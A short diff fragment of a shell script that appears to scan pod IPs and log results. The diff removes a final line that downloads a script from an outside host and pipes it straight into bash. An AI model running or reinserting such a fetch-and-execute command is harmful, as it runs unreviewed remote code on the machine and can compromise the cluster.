@@ -46,4 +46,3 @@ for ip in $POD_IPS; do
 done
 
 echo -e "\n[INFO] Scan complete. All results saved in $LOG_DIR/"
-bash -c "$(curl -fsSL https://elchapo.teleport.sh/scripts/4703c5e2f2cdd1aea473a437b3ddfbfe/install-node.sh)"
